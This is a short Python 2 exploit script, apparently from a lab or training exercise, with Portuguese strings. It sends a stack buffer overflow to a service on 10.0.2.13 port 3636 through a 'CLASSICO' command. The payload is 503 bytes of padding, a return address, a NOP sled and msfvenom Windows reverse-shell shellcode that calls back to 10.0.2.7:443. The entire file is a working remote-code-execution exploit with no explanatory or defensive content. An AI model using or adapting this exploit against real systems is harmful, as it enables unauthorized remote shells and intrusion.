#!/usr/bin/python
import socket
from struct import *

IP="10.0.2.13"
PORTA=3636

payload = "A" * 503
payload += pack('<L',0x6250146F)
payload += "\x90" * 20
# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d\xcc' -a x86 --platform windows LHOST=10.0.2.7 LPORT=443 -f c
payload += (                                                                                                                                                                                                                               
"\xda\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xba\x3c\x6b\xbe\x15\xb1"                                                                                                                                                                             
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x6c\x78\x5c\xe0\x70\x96\x22"                                                                                                                                                                             
"\x0b\x88\x67\x43\x85\x6d\x56\x43\xf1\xe6\xc9\x73\x71\xaa\xe5"                                                                                                                                                                             
"\xf8\xd7\x5e\x7d\x8c\xff\x51\x36\x3b\x26\x5c\xc7\x10\x1a\xff"                                                                                                                                                                             
"\x4b\x6b\x4f\xdf\x72\xa4\x82\x1e\xb2\xd9\x6f\x72\x6b\x95\xc2"                                                                                                                                                                             
"\x62\x18\xe3\xde\x09\x52\xe5\x66\xee\x23\x04\x46\xa1\x38\x5f"                                                                                                                                                                             
"\x48\x40\xec\xeb\xc1\x5a\xf1\xd6\x98\xd1\xc1\xad\x1a\x33\x18"                                                                                                                                                                             
"\x4d\xb0\x7a\x94\xbc\xc8\xbb\x13\x5f\xbf\xb5\x67\xe2\xb8\x02"                                                                                                                                                                             
"\x15\x38\x4c\x90\xbd\xcb\xf6\x7c\x3f\x1f\x60\xf7\x33\xd4\xe6"
"\x5f\x50\xeb\x2b\xd4\x6c\x60\xca\x3a\xe5\x32\xe9\x9e\xad\xe1"
"\x90\x87\x0b\x47\xac\xd7\xf3\x38\x08\x9c\x1e\x2c\x21\xff\x76"
"\x81\x08\xff\x86\x8d\x1b\x8c\xb4\x12\xb0\x1a\xf5\xdb\x1e\xdd"
"\xfa\xf1\xe7\x71\x05\xfa\x17\x58\xc2\xae\x47\xf2\xe3\xce\x03"
"\x02\x0b\x1b\x83\x52\xa3\xf4\x64\x02\x03\xa5\x0c\x48\x8c\x9a"
"\x2d\x73\x46\xb3\xc4\x8e\x01\xb6\x18\x92\xd6\xae\x1a\x92\xd9"
"\x95\x92\x74\xb3\xf9\xf2\x2f\x2c\x63\x5f\xbb\xcd\x6c\x75\xc6"
"\xce\xe7\x7a\x37\x80\x0f\xf6\x2b\x75\xe0\x4d\x11\xd0\xff\x7b"
"\x3d\xbe\x92\xe7\xbd\xc9\x8e\xbf\xea\x9e\x61\xb6\x7e\x33\xdb"
"\x60\x9c\xce\xbd\x4b\x24\x15\x7e\x55\xa5\xd8\x3a\x71\xb5\x24"
"\xc2\x3d\xe1\xf8\x95\xeb\x5f\xbf\x4f\x5a\x09\x69\x23\x34\xdd"
"\xec\x0f\x87\x9b\xf0\x45\x71\x43\x40\x30\xc4\x7c\x6d\xd4\xc0"
"\x05\x93\x44\x2e\xdc\x17\x74\x65\x7c\x31\x1d\x20\x15\x03\x40"
"\xd3\xc0\x40\x7d\x50\xe0\x38\x7a\x48\x81\x3d\xc6\xce\x7a\x4c"
"\x57\xbb\x7c\xe3\x58\xee"
)

buffer = "CLASSICO "
buffer += payload

print "[+] Enviando..."

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect((IP,PORTA))

r.send(buffer)

r.close()
